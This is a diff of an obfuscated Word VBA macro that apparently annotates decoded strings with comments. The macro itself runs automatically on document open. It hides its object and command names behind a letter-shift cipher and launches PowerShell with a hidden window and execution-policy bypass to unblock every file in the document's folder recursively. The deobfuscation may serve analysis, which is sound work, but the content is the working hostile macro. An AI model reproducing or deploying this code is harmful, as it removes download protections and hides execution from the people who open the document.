@@ -15,10 +15,10 @@ Sub AutoOpen()
     Dim shell As Object
     
     Dim fsoStr As String
-    fsoStr = DecodeString("Tdsjqujoh/GjmfTztufnPckfdu")
+    fsoStr = DecodeString("Tdsjqujoh/GjmfTztufnPckfdu") ' Scripting.FileSystemObject
     
     Dim shellStr As String
-    shellStr = DecodeString("XTdsjqu/Tifmm")
+    shellStr = DecodeString("XTdsjqu/Tifmm") ' WScript.Shell
     
     Set fso = CreateObject(fsoStr)
     Set shell = CreateObject(shellStr)
@@ -59,9 +59,9 @@ Sub ExecuteCleanup()
     Dim temp3 As String
     Dim fullCmd As String
     
-    temp1 = DecodeString("qpxfstifmm/fyf")
-    temp2 = DecodeString("Hfu.DijmeJufn")
-    temp3 = DecodeString("Vocmpdl.Gjmf")
+    temp1 = DecodeString("qpxfstifmm/fyf") ' powershell.exe
+    temp2 = DecodeString("Hfu.DijmeJufn") ' Get-ChildItem
+    temp3 = DecodeString("Vocmpdl.Gjmf") ' Unblock-File
     
     path = ActiveDocument.Path
     
@@ -74,7 +74,7 @@ Sub ExecuteCleanup()
     cmd = temp2 & " -Path '" & path & "' -Recurse | " & temp3
     fullCmd = temp1 & " -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & cmd & """"
     
-    Set obj = CreateObject(DecodeString("XTdsjqu/Tifmm"))
+    Set obj = CreateObject(DecodeString("XTdsjqu/Tifmm")) ' WScript.Shell
     obj.Run fullCmd, 0, False
     
     Dim waitTime As Double
